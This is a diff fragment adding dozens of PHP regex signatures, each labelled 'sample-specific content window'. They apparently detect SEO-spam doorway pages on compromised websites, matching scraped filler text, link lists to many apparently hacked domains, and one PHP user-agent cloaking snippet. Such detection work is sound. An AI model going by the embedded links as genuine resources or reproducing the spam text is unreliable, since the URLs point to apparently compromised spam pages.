+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1046 => 
+    array (
+      'pattern' => '/ly Speeduino\\.  90\\-94 Mazda Protege LX\\/Escort GT PNP Speeduino ECU \\$ 260\\.  Speeduino MaxxECU Mazda Mx5 Standalone PnP Sta/s',
+      'label' => 'sample-specific content window',
+    ),
+    1047 => 
+    array (
+      'pattern' => '/nia\\.com\\.br\\/qbci\\/ansible\\-check\\-if\\-host\\-is\\-reachable\\.html\\>m4\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1048 => 
+    array (
+      'pattern' => '/e Touchscreen Download \\- ssd\\-253x\\-ts \\- goodix811 \\- zet6221_ts \\- ct360_ts \\- elan_ts \\- gt811 \\(goodix811 alternative\\) \\- gt8/s',
+      'label' => 'sample-specific content window',
+    ),
+    1049 => 
+    array (
+      'pattern' => '/x\\-rom\\.html\\>mz\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1050 => 
+    array (
+      'pattern' => '/p\\:\\/\\/gabbyfrenchies\\.com\\/zy9grs\\/page\\-flip\\-effect\\-css\\.html\\>05\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1051 => 
+    array (
+      'pattern' => '/\\/vmware\\-workstation\\-download\\.html\\>2o\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1052 => 
+    array (
+      'pattern' => '/ery\\-powered, all\\-in\\-one Z\\-Wave motion, temperature, humidity, and lighting sensor–rated for both indoor and outdoor us/s',
+      'label' => 'sample-specific content window',
+    ),
+    1053 => 
+    array (
+      'pattern' => '/u\\/new\\-biology\\-syllabus\\-notes\\.html\\>el\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1054 => 
+    array (
+      'pattern' => '/\\<\\!DOCTYPE html\\>
+
+\\<html prefix\\="content\\:   dc\\:[\\s\\S]{0,12000}elecommunications provider in southeast Oklahoma/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1055 => 
+    array (
+      'pattern' => '/ganda\\.html\\>4h\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1056 => 
+    array (
+      'pattern' => '/omes with\\.  The UK Ministry of Defence \\(MoD\\) has been found to have used chromium\\-based military paint to corrosion\\-proo/s',
+      'label' => 'sample-specific content window',
+    ),
+    1057 => 
+    array (
+      'pattern' => '/rsonality\\-disorder\\-criteria\\.html\\>tn\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1058 => 
+    array (
+      'pattern' => '/owplay\\-flickering\\-recordings\\.html\\>1y\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1059 => 
+    array (
+      'pattern' => '/ista Download Apps\\/Games for PC\\/Laptop\\/Windows 7,8,10\\.  ALSong Lyrics Live MP3 Player\\.  Our player can play your videos/s',
+      'label' => 'sample-specific content window',
+    ),
+    1060 => 
+    array (
+      'pattern' => '/s to your PS4&\\#39;s hard drive like the PlayStation 3, so instead you&\\#39;ll need to use a computer to create your audio/s',
+      'label' => 'sample-specific content window',
+    ),
+    1061 => 
+    array (
+      'pattern' => '/loyee\\-performance\\-portal\\.html\\>5g\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1062 => 
+    array (
+      'pattern' => '/swers\\.html\\>us\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1063 => 
+    array (
+      'pattern' => '/\\<\\/a\\>, \\<a href\\=http\\:\\/\\/hamrahparvaz\\.com\\/nmc7\\/lazarus\\-database\\-tutorial\\.html\\>qd\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1064 => 
+    array (
+      'pattern' => '/ogram\\.html\\>e9\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1065 => 
+    array (
+      'pattern' => '/s Guy, correct\\?” Williamson County Tennessee \\.[\\s\\S]{0,12000}\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1066 => 
+    array (
+      'pattern' => '/ak\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1067 => 
+    array (
+      'pattern' => '/"hita", "hp i",
+          "hpip", "hs\\-c", "htc[\\s\\S]{0,12000}se; \\/\\/ \\?\\?\\?\\?\\?\\?\\?\\?\\? \\?\\?\\?\\?\\?\\?\\? \\?\\? \\?\\?\\?\\?\\?\\?\\?\\?\\?
+\\}
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1068 => 
+    array (
+      'pattern' => '/ef\\=http\\:\\/\\/abczarter\\.pl\\/jgz\\/dell\\-maxxaudio\\-settings\\.html\\>68\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1069 => 
+    array (
+      'pattern' => '/el problema es pyqt5 , siendo que este funcionab[\\s\\S]{0,12000}l\\>db\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1070 => 
+    array (
+      'pattern' => '/sign\\.html\\>th\\<\\/a\\>, \\<a href\\=http\\:\\/\\/azlan\\.com\\.pk\\/ahbn\\/blur\\-tool\\-macbook\\.html\\>op\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1071 => 
+    array (
+      'pattern' => '/\\-active\\.com\\/aap7kedz\\/red\\-swamp\\-crayfish\\-aquaponics\\.html\\>dd\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1072 => 
+    array (
+      'pattern' => '/ion\\-developer\\-fresher\\-resume\\.html\\>oe\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1073 => 
+    array (
+      'pattern' => '/sk\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1074 => 
+    array (
+      'pattern' => '/miles on a new big bore kit, you might not have[\\s\\S]{0,12000}l\\>vy\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1075 => 
+    array (
+      'pattern' => '/e\\-vinyl\\-glow\\-in\\-the\\-dark\\.html\\>yb\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1076 => 
+    array (
+      'pattern' => '/out her career\\.  Singer Songwriter \\/ pop \\/ hip hop Shree Moteshwar \\(Bheema Shankar\\) Mahadev is in the Ujjanak area of Ka/s',
+      'label' => 'sample-specific content window',
+    ),
+    1077 => 
+    array (
+      'pattern' => '/bi\\/can\\-biotin\\-cause\\-spotting\\.html\\>k7\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1078 => 
+    array (
+      'pattern' => '/r\\/nosler\\-accubond\\-long\\-range\\.html\\>j2\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1079 => 
+    array (
+      'pattern' => '/ojancapitalinvest\\.cz\\/ch4qj\\/priyanka\\-singh\\-designer\\.html\\>uk\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1080 => 
+    array (
+      'pattern' => '/ou must use the standard file extension \\.  Staying in The average salary for a Software Development Engineer \\(SDE\\) is \\$1/s',
+      'label' => 'sample-specific content window',
+    ),
+    1081 => 
+    array (
+      'pattern' => '/gainst\\-spirit\\-of\\-setback\\.html\\>ya\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1082 => 
+    array (
+      'pattern' => '/p\\:\\/\\/myins\\.co\\.uk\\/ozcwz\\/infiniti\\-sd\\-card\\-license\\-key\\.html\\>fc\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1083 => 
+    array (
+      'pattern' => '/inder\\.html\\>i2\\<\\/a\\>, \\<a href\\=http\\:\\/\\/netnode\\.co\\.uk\\/0rwn\\/fsc\\-result\\-2018\\.html\\>3u\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1084 => 
+    array (
+      'pattern' => '/Windows 7,8,10 and have the fun experience of using the smartphone Apps on Desktop or personal computers\\. 00, you should/s',
+      'label' => 'sample-specific content window',
+    ),
+    1085 => 
+    array (
+      'pattern' => '/ndpartybus\\.com\\/y9laneh0\\/residency\\-match\\-calculator\\.html\\>lc\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1086 => 
+    array (
+      'pattern' => '/er Speakers Under \\$100\\.  For the most part, the machine&\\#39;s specs aren&\\#39;t really relevant, except for the fact that/s',
+      'label' => 'sample-specific content window',
+    ),
+    1087 => 
+    array (
+      'pattern' => '/on\\-fiber\\-steering\\-wheel\\-g37\\.html\\>kp\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1088 => 
+    array (
+      'pattern' => '/incial nominee processing time\\<br\\>\\<br\\>
+
+
+
+\\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1089 => 
+    array (
+      'pattern' => '/\\-powder\\.html\\>7r\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.myopentip\\.com\\/xrlf\\/gorm\\-ping\\.html\\>j7\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1090 => 
+    array (
+      'pattern' => '/in\\/bye4ryu\\/vb\\-net\\-nfc\\-reader\\.html\\>jj\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1091 => 
+    array (
+      'pattern' => '/geles\\.html\\>jv\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1092 => 
+    array (
+      'pattern' => '/4h\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1093 => 
+    array (
+      'pattern' => '/\\/mayspaskincare\\.com\\/iaxykjv0\\/hoodoo\\-dolls\\-for\\-sale\\.html\\>gf\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1094 => 
+    array (
+      'pattern' => '/code\\.com\\/wp\\-content\\/themes\\/guava\\/igu\\/activator\\-ipa\\.html\\>tf\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1095 => 
+    array (
+      'pattern' => '/ader\\-x\\-creepypasta\\-lemon\\.html\\>fr\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1096 => 
+    array (
+      'pattern' => '/ku\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1097 => 
+    array (
+      'pattern' => '/nougat\\.html\\>sy\\<\\/a\\>, \\<a href\\=http\\:\\/\\/kwnong\\.com\\/egvt\\/java\\-quick\\-server\\.html\\>k9\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1098 => 
+    array (
+      'pattern' => '/ttp\\:\\/\\/www\\.anthesis\\-coaching\\.fr\\/a2z4z8\\/bleeding\\-after\\-menopause\\-forum\\.html\\>dd\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1099 => 
+    array (
+      'pattern' => '/\\/guava\\/4xa\\/40x60\\-shop\\-layout\\.html\\>gn\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1100 => 
+    array (
+      'pattern' => '/e\\-forex\\.ru\\/4qvi\\/nokia\\-c7\\.html\\>jo\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1101 => 
+    array (
+      'pattern' => '/com\\/aa3am\\/zip\\-unzip\\-program\\.html\\>qn\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1102 => 
+    array (
+      'pattern' => '/B\\.  Jun 20, 2015 Hi guys,\\.  \\.  The runbot allows you to directly access the underlying Odoo source code on Github as wel/s',
+      'label' => 'sample-specific content window',
+    ),
+    1103 => 
+    array (
+      'pattern' => '/opbox\\.html\\>sr\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1104 => 
+    array (
+      'pattern' => '/CefSharp\\. 4921\\. 1 includes a few new API’s as well\\.  C\\# \\(CSharp\\) CefSharp \\- 25 examples found\\.  Example of LoadHtml wi/s',
+      'label' => 'sample-specific content window',
+    ),
+    1105 => 
+    array (
+      'pattern' => '/vp5r\\/double\\-names\\-with\\-grace\\.html\\>re\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1106 => 
+    array (
+      'pattern' => '/y\\: A Memoir\\.  Roma, rightly , considered to be one of the largest ethnic minority in Europe\\.  Trailer \\| 08\\/29\\/2000 \\| 3 M/s',
+      'label' => 'sample-specific content window',
+    ),
+    1107 => 
+    array (
+      'pattern' => '/show how to build a multi\\-user socket\\-based program with Haxe \\(e\\. io\\/socket\\. js, providing a better understanding of the/s',
+      'label' => 'sample-specific content window',
+    ),
+    1108 => 
+    array (
+      'pattern' => '/laristrading\\.com\\/on545n\\/pendulum\\-reading\\-yes\\-or\\-no\\.html\\>gj\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1109 => 
+    array (
+      'pattern' => '/\\<a href\\=http\\:\\/\\/goldcontentwriters\\.com\\/r5vbcge\\/material\\-ui\\-select\\-all\\.html\\>wc\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1110 => 
+    array (
+      'pattern' => '/ties into total fan likes and interactions on social&nbsp; Mobilogy \\(Comercial y minoristas, móvil del Ciclo de Vida\\) 3/s',
+      'label' => 'sample-specific content window',
+    ),
+    1111 => 
+    array (
+      'pattern' => '/t 7 Vintage Leather Business Travel Bag \\/ Messenger \\/ Duffle Bag \\/ Weekend Bag \\- discount designer bags, large leather b/s',
+      'label' => 'sample-specific content window',
+    ),
+    1112 => 
+    array (
+      'pattern' => '/linux\\.html\\>a9\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1113 => 
+    array (
+      'pattern' => '/iles\\-best\\-cold\\-weather\\-armor\\.html\\>tj\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1114 => 
+    array (
+      'pattern' => '/mx\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1115 => 
+    array (
+      'pattern' => '/\\-head\\.html\\>yv\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1116 => 
+    array (
+      'pattern' => '/partmental energy publication, featuring refinin[\\s\\S]{0,12000}v\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1117 => 
+    array (
+      'pattern' => '/tan\\) and 10\\. dr2\\. 1 for Android – Download Guide an ever\\-growing Line through a multiple of environments, listening ca/s',
+      'label' => 'sample-specific content window',
+    ),
+    1118 => 
+    array (
+      'pattern' => '/urrent\\-affairs\\-book\\-2018\\.html\\>y9\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1119 => 
+    array (
+      'pattern' => '/0auig\\/revit\\-db\\-link\\-2019\\.html\\>n4\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1120 => 
+    array (
+      'pattern' => '/\\<\\!DOCTYPE html\\>
+
+\\<html prefix\\="og\\: \\#" lang\\="en\\-U[\\s\\S]{0,12000}d 6 day versions\\) as well as the CAP3, CAP6, CAP/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1121 => 
+    array (
+      'pattern' => '/lobal\\.com\\.ar\\/ofdhx\\/tally\\-integration\\-documentation\\.html\\>sf\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1122 => 
+    array (
+      'pattern' => '/vz\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
